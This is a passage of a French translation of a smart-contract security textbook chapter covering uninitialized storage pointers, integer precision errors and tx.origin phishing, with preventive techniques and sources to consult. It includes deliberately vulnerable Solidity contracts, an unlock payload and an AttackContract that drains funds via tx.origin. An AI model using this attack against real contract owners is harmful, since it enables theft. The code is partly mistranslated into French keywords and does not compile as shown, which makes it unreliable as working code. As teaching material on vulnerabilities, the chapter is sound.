Pour en savoir plus sur le stockage et la mémoire dans l'EVM, consultez la documentation de Solidity sur http://bit.ly/2OdUU0l[+++l'emplacement des données+++] , la http://bit.ly/2JslDWf[+++disposition des variables d'état dans le stockage+++] et http://bit.ly/2Dch2Hc[+++la disposition dans la mémoire+++] .

[width="100%",cols="12%,88%",options="header",]
|===
|*REMARQUE* |Cette section est basée sur un excellent http://bit.ly/2ERI0pb[+++article de Stefan Beyer+++] . D'autres lectures sur ce sujet, inspirées par Stefan, peuvent être trouvées dans ce http://bit.ly/2OgxPtG[+++fil Reddit+++] .
|===

La vulnérabilité

Les variables locales dans les fonctions sont par défaut le stockage ou la mémoire en fonction de leur type. Les variables de stockage local non initialisées peuvent contenir la valeur d'autres variables de stockage dans le contrat ; ce fait peut provoquer des vulnérabilités involontaires ou être exploité délibérément.

Considérons le contrat de bureau d'enregistrement de noms relativement simple dans file:///\\\\wsl.localhost\\Ubuntu-20.04\\home\\syr3fx\\Code\\github\\maitriser-ca\\LivreMaitriserEthereum\\adoc\\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#nameregistrar_security[+++NameRegistrar.sol+++] .

_Exemple 12. NomRegistrar.sol_

// Un bureau d'enregistrement de noms verrouillé

contrat NomRegistrar \{

bool public déverrouillé = faux ; // bureau d'enregistrement verrouillé, pas de mises à jour de nom

struct NameRecord \{ // mappe les hachages aux adresses

bytes32 nom ;

adresse mappéeAdresse ;

}

// enregistre les noms enregistrés

mapping( address => NameRecord ) public registerNameRecord ;

// résout les hachages en adresses

mappage ( octets32 => adresse) résolution publique ;

function register( bytes32 _name, address _ mappedAddress ) public \{

// configure le nouveau NameRecord

NomEnregistrement nouvelenregistrement ;

newRecord.name = _ nom ;

newRecord.mappedAddress = _ mappedAddress ;

résoudre[_nom] = _ mappedAddress ;

registerNameRecord [ msg.sender ] = newRecord ;

exiger (déverrouillé); // n'autorise les inscriptions que si le contrat est déverrouillé

}

}

Ce simple registraire de noms n'a qu'une seule fonction. Lorsque le contrat est déverrouillé , il permet à quiconque d'enregistrer un nom (sous forme de hachage bytes32 ) et de mapper ce nom à une adresse. Le bureau d'enregistrement est initialement verrouillé et l' exigence à la ligne 25 empêche le registre d'ajouter des enregistrements de nom. Il semble que le contrat soit inutilisable, car il n'y a aucun moyen de déverrouiller le registre ! Il existe cependant une vulnérabilité qui permet l'enregistrement du nom quelle que soit la variable déverrouillée .

Pour discuter de cette vulnérabilité, nous devons d'abord comprendre comment fonctionne le stockage dans Solidity. En tant qu'aperçu de haut niveau (sans aucun détail technique approprié - nous vous suggérons de lire les documents Solidity pour un examen approprié), les variables d'état sont stockées séquentiellement dans les _emplacements_ tels qu'ils apparaissent dans le contrat (ils peuvent être regroupés mais ne sont pas dans ce exemple, donc nous ne nous en préoccuperons pas). Ainsi, unlocked existe dans slot[ 0] , registerNameRecord dans slot[1] , et resolve dans slot[2] , etc. Chacun de ces slots a une taille de 32 octets (il y a des complexités supplémentaires avec les mappages, que nous ignorerons pour à présent). Le booléen déverrouillé ressemblera à 0x000… ​0 (64 0s, à l'exclusion du 0x ) pour false ou 0x000… ​1 (63 0s) pour true . Comme vous pouvez le voir, il y a un important gaspillage de stockage dans cet exemple particulier .

La pièce suivante du puzzle est que Solidity place par défaut des types de données complexes, tels que des structures, en stockage lors de leur initialisation en tant que variables locales. Par conséquent, newRecord à la ligne 18 utilise par défaut le stockage. La vulnérabilité est causée par le fait que newRecord n'est pas initialisé. Comme il s'agit par défaut du stockage, il est mappé sur le slot de stockage[ 0], qui contient actuellement un pointeur vers unlocked . Notez qu'aux lignes 19 et 20, nous définissons ensuite newRecord.name sur _name et newRecord.mappedAddress sur _mappedAddress ; cela met à jour les emplacements de stockage de slot[ 0] et slot[1], ce qui modifie à la fois déverrouillé et l'emplacement de stockage associé à registerNameRecord .

Cela signifie que unlocked peut être modifié directement, simplement par le paramètre bytes32 _name de la fonction register . Par conséquent, si le dernier octet de _name est différent de zéro, il modifiera le dernier octet de storage slot[ 0] et changera directement unlocked en true . De telles valeurs _name entraîneront la réussite de l'appel require sur la ligne 25, car nous avons défini unlocked sur true . Essayez ceci dans Remix. Notez que la fonction passera si vous utilisez un _name du formulaire :

0x00000000000000000000000000000000000000000000000000000000000001

Techniques préventives

Solidity affiche un avertissement pour les variables de stockage non initialisées ; les développeurs doivent prêter une attention particulière à ces avertissements lors de la création de contrats intelligents. La version actuelle de Mist (0.10) ne permet pas de compiler ces contrats. Il est souvent recommandé d'utiliser explicitement les spécificateurs de mémoire ou de stockage lorsqu'il s'agit de types complexes, pour s'assurer qu'ils se comportent comme prévu.

Exemples concrets : OpenAddressLottery et CryptoRoulette Honey Pots

Un pot de miel nommé http://bit.ly/2AAVnWD[+++OpenAddressLottery+++] a été déployé qui a utilisé cette bizarrerie de variable de stockage non initialisée pour collecter de l'éther auprès de certains pirates potentiels. Le contrat est plutôt impliqué, nous laisserons donc l'analyse au http://bit.ly/2OgxPtG[+++fil Reddit+++] où l'attaque est assez clairement expliquée.

Un autre pot de miel, http://bit.ly/2OfNGJ2[+++CryptoRoulette+++] , a également utilisé cette astuce pour essayer de collecter de l'éther. Si vous ne pouvez pas comprendre comment fonctionne l'attaque, consultez http://bit.ly/2OVkSL4[+++« Une analyse de quelques contrats de pot de miel Ethereum »+++] pour un aperçu de ce contrat et d'autres.

Virgule flottante et précision

Au moment d'écrire ces lignes (v0.4.24), Solidity ne prend pas en charge les nombres à virgule fixe et à virgule flottante. Cela signifie que les représentations en virgule flottante doivent être construites avec des types entiers dans Solidity. Cela peut entraîner des erreurs et des vulnérabilités s'il n'est pas mis en œuvre correctement.

[width="100%",cols="12%,88%",options="header",]
|===
|*REMARQUE* |Pour en savoir plus, consultez le http://bit.ly/2Ogp2Ia[+++wiki Ethereum Contract Security Techniques and Tips+++] .
|===

La vulnérabilité

Comme il n'y a pas de type à virgule fixe dans Solidity, les développeurs doivent implémenter le leur en utilisant les types de données entiers standard. Il existe un certain nombre de pièges que les développeurs peuvent rencontrer au cours de ce processus. Nous allons essayer d'en souligner quelques-uns dans cette section.

Commençons par un exemple de code (nous ignorerons les problèmes de débordement/sous-dépassement, abordés plus haut dans ce chapitre, pour plus de simplicité) :

contract FunWithNumbers \{

jetons publics constants uintPerEth = 10 ;

uint constante publique weiPerEth = 1e18 ;

mapping( address => uint ) balances publiques ;

function buyTokens ( ) externe payable \{

// convertit wei en eth, puis multiplie par le taux de jeton

jetons uint = msg.value / weiPerEth * tokensPerEth ;

balances[ msg.sender ] += jetons ;

}

function sellTokens ( jetons uint ) public \{

require(balances[ msg.sender ] >= tokens);

uint eth = tokens/ tokensPerEth ;

balances[ msg.sender ] -= jetons ;

msg.sender .transfer (eth* weiPerEth );

}

}

Ce simple contrat d'achat/vente de jetons présente des problèmes évidents. Bien que les calculs mathématiques pour l'achat et la vente de jetons soient corrects, l'absence de nombres à virgule flottante donnera des résultats erronés. Par exemple, lors de l'achat de jetons sur la ligne 8, si la valeur est inférieure à 1 éther , la division initiale donnera 0 , laissant le résultat de la multiplication finale à 0 (par exemple, 200 wei divisé par 1e18 weiPerEth est égal à 0 ). De même, lors de la vente de jetons, tout nombre de jetons inférieur à 10 entraînera également 0 ether . En fait, l'arrondi ici est toujours inférieur, donc la vente de 29 jetons se traduira par 2 ether .

Le problème avec ce contrat est que la précision n'est qu'à l'éther le plus proche (c'est-à-dire 1e18 wei ). Cela peut devenir délicat lorsqu'il s'agit de décimales dans les jetons https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md[+++ERC20+++] lorsque vous avez besoin d'une plus grande précision.

Techniques préventives

Garder la bonne précision dans vos contrats intelligents est très important, en particulier lorsqu'il s'agit de ratios et de taux qui reflètent des décisions économiques.

Vous devez vous assurer que tous les ratios ou taux que vous utilisez permettent de grands numérateurs dans les fractions. Par exemple, nous avons utilisé le taux tokensPerEth dans notre exemple. Il aurait été préférable d'utiliser weiPerTokens , qui serait un grand nombre. Pour calculer le nombre correspondant de jetons, nous pourrions faire msg.value / weiPerTokens . Cela donnerait un résultat plus précis.

Une autre tactique à garder à l'esprit est de garder à l'esprit l'ordre des opérations. Dans notre exemple, le calcul pour acheter des jetons était msg.value / weiPerEth * tokenPerEth . Notez que la division se produit avant la multiplication. (La solidité, contrairement à certains langages, garantit d'effectuer les opérations dans l'ordre dans lequel elles sont écrites.) Cet exemple aurait atteint une plus grande précision si le calcul effectuait d'abord la multiplication puis la division ; c'est-à-dire msg.value * tokenPerEth / weiPerEth .

Enfin, lors de la définition d'une précision arbitraire pour les nombres, il peut être judicieux de convertir les valeurs en une précision supérieure, d'effectuer toutes les opérations mathématiques, puis de les reconvertir finalement à la précision requise pour la sortie. Généralement , les uint256 sont utilisés (car ils sont optimaux pour l'utilisation du gaz); ceux-ci donnent environ 60 ordres de grandeur dans leur gamme, dont certains peuvent être dédiés à la précision des opérations mathématiques. Il se peut qu'il soit préférable de conserver toutes les variables en haute précision dans Solidity et de les reconvertir en précisions inférieures dans les applications externes (c'est essentiellement ainsi que fonctionne la variable décimale dans les contrats de jeton ERC20). Pour voir un exemple de la façon dont cela peut être fait, nous vous recommandons de regarder https://github.com/dapphub/ds-math[+++DS-Math+++] . Il utilise des noms funky ("wads" et "rays"), mais le concept est utile.

Exemple concret : Ethstick

Le http://bit.ly/2Qb7PSB[+++contrat+++] +++Ethstick+++ n'utilise pas la précision étendue ; cependant, il traite de wei . Donc, ce contrat aura des problèmes d'arrondi, mais seulement au niveau de précision wei . Il a quelques défauts plus graves, mais ceux-ci sont liés à la difficulté d'obtenir de l'entropie sur la blockchain (voir file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#entropyillusion_security[+++Entropy Illusion+++] ). Pour une discussion plus approfondie du contrat Ethstick , nous vous renverrons à un autre article de Peter Vessenes , http://bit.ly/2SwDnE0[+++"Les contrats Ethereum vont être des bonbons pour les pirates"+++] .

Authentification Tx.Origin

Solidity a une variable globale, tx.origin , qui parcourt toute la pile d'appels et contient l'adresse du compte qui a initialement envoyé l'appel (ou la transaction). L'utilisation de cette variable pour l'authentification dans un contrat intelligent rend le contrat vulnérable à une attaque de type hameçonnage.

[width="100%",cols="12%,88%",options="header",]
|===
|*REMARQUE* |Pour en savoir plus, consultez la question Ethereum http://bit.ly/2PxU1UM[+++Stack Exchange de dbryson+++] , http://bit.ly/2qm7ocJ[+++"+++ +++Tx.Origin+++ +++and Ethereum Oh My!"+++] de Peter Vessenes et http://bit.ly/2P3KVA4[+++"Solidity : Tx Origin Attacks"+++] de Chris Coverdale.
|===

La vulnérabilité

Les contrats qui autorisent les utilisateurs à utiliser la variable tx.origin sont généralement vulnérables aux attaques de phishing qui peuvent inciter les utilisateurs à effectuer des actions authentifiées sur le contrat vulnérable. Considérez le contrat simple dans file:///\\wsl.localhost\Ubuntu-20.04\home\syr3fx\Code\github\maitriser-ca\LivreMaitriserEthereum\adoc\for_use_ethereumbook_09smart-contracts-securitytxt_fr_CA.html#phishable_security[+++Phishable.sol+++] .

_Exemple 13. Phishable.sol_

contrat Phishable \{

adresse propriétaire public ;

constructeur (adresse _owner) \{

propriétaire = _ propriétaire ;

}

function () external payable \{} // collecte de l'éther

fonction retireTout ( adresse _destinataire) public \{

require( tx.origin == propriétaire);

_ destinataire.transfert ( this.balance );

}

}

Notez qu'à la ligne 11 le contrat autorise la fonction removeAll en utilisant tx.origin . Ce contrat permet à un attaquant de créer un contrat d'attaque de la forme :

importer " Phishable.sol " ;

contract AttaqueContrat \{

Phishable phisableContrat ;

adresse attaquant; // L'adresse de l'attaquant pour recevoir les fonds

constructeur ( Phishable _ phishableContract , adresse _ attackerAddress ) \{

phisableContrat = _ phisableContrat ;

attaquant = _ attaquantAdresse ;

}

fonction () payable \{

phishableContract.withdrawAll (attaquant );

}

}

L'attaquant pourrait déguiser ce contrat en sa propre adresse privée et organiser socialement la victime (le propriétaire du contrat Phishable ) pour envoyer une forme de transaction à l'adresse, peut-être en envoyant ce contrat une certaine quantité d'éther. La victime, à moins d'être prudente, peut ne pas remarquer qu'il y a du code à l'adresse de l'attaquant, ou l'attaquant peut le faire passer pour un portefeuille multisignature ou un portefeuille de stockage avancé (rappelez-vous que le code source des marchés publics n'est pas disponible par défaut) .

Dans tous les cas, si la victime envoie une transaction avec suffisamment de gaz à l' adresse AttackContract , elle invoquera la fonction de secours, qui à son tour appellera la fonction retireAll du contrat Phishable avec le paramètre attaquant . Cela entraînera le retrait de tous les fonds du contrat Phishable à l'adresse de l' attaquant . C'est parce que l'adresse qui a initialement initialisé l'appel était la victime (c'est-à-dire le propriétaire du contrat Phishable ). Par conséquent, tx.origin sera égal à propriétaire et l' exigence à la ligne 11 du contrat Phishable passera.

Techniques préventives

tx.origin ne doit pas être utilisé pour l'autorisation dans les contrats intelligents. Cela ne veut pas dire que la variable tx.origin ne doit jamais être utilisée. Il existe des cas d'utilisation légitimes dans les contrats intelligents. Par exemple, si l'on voulait empêcher les contrats externes d'appeler le contrat actuel, on pourrait implémenter un require de la forme require( tx.origin == msg.sender ) . Cela empêche l'utilisation de contrats intermédiaires pour appeler le contrat en cours, limitant le contrat à des adresses sans code régulières.

Bibliothèques contractuelles

De nombreux codes existants sont disponibles pour être réutilisés, à la fois déployés en chaîne en tant que bibliothèques appelables et hors chaîne en tant que bibliothèques de modèles de code. Les bibliothèques sur plate-forme, ayant été déployées, existent sous forme de contrats intelligents de bytecode, il faut donc faire très attention avant de les utiliser en production. Cependant, l'utilisation de bibliothèques sur plate-forme existantes bien établies présente de nombreux avantages, tels que la possibilité de bénéficier des dernières mises à jour, et vous permet d'économiser de l'argent et profite à l'écosystème Ethereum en réduisant le nombre total de contrats en direct dans Ethereum.

Dans Ethereum, la ressource la plus largement utilisée est la https://openzeppelin.org/[+++suite+++] +++OpenZeppelin+++ , une vaste bibliothèque de contrats allant des implémentations de jetons ERC20 et ERC721, à de nombreuses variantes de modèles de crowdsale , en passant par des comportements simples couramment trouvés dans les contrats, tels que Ownable , Pausable ou LimitBalance. . Les contrats de ce référentiel ont été largement testés et, dans certains cas , fonctionnent même comme des implémentations standard _de facto ._ Ils sont libres d' utilisation et sont construits et maintenus par https://zeppelin.solutions[+++Zeppelin+++] avec une liste sans cesse croissante de contributeurs externes.

Également de Zeppelin est https://zeppelinos.org/[+++ZeppelinOS+++] , une plate-forme open source de services et d'outils pour développer et gérer en toute sécurité des applications de contrat intelligent. ZeppelinOS fournit une couche au-dessus de l'EVM qui permet aux développeurs de lancer facilement des DApp évolutives liées à une bibliothèque en chaîne de contrats bien testés qui sont eux-mêmes évolutifs. Différentes versions de ces bibliothèques peuvent coexister sur la plate-forme Ethereum, et un système de caution permet aux utilisateurs de proposer ou de pousser des améliorations dans différentes directions. Un ensemble d'outils hors chaîne pour déboguer, tester, déployer et surveiller les applications décentralisées est également fourni par la plate-forme.

Le projet ethpm vise à organiser les différentes ressources qui se développent dans l'écosystème en proposant un système de gestion de packages. En tant que tel, leur registre fournit plus d'exemples à parcourir :

* {blank}
+
____
Site Web : https://www.ethpm.com/[+++https://www.ethpm.com/+++]
____
* {blank}
+
____
Lien vers le référentiel : https://www.ethpm.com/registry[+++https://www.ethpm.com/registry+++]
____
* {blank}
+
____
Lien GitHub : https://github.com/ethpm[+++https://github.com/ethpm+++]
____
* {blank}
+
____
Documentation : https://www.ethpm.com/docs/integration-guide[+++https://www.ethpm.com/docs/integration-guide+++]
____

conclusion

Tout développeur travaillant dans le domaine des contrats intelligents a beaucoup à savoir et à comprendre. En suivant les meilleures pratiques dans la conception de votre contrat intelligent et la rédaction de votre code, vous éviterez de nombreux pièges et pièges graves.

Le principe de sécurité logicielle le plus fondamental est peut-être de maximiser la réutilisation du code de confiance. En cryptographie, c'est si important qu'il a été condensé en un adage : "Ne lancez pas votre propre crypto." Dans le cas des contrats intelligents, cela revient à tirer le meilleur parti possible des bibliothèques librement disponibles qui ont été soigneusement contrôlées par la communauté.
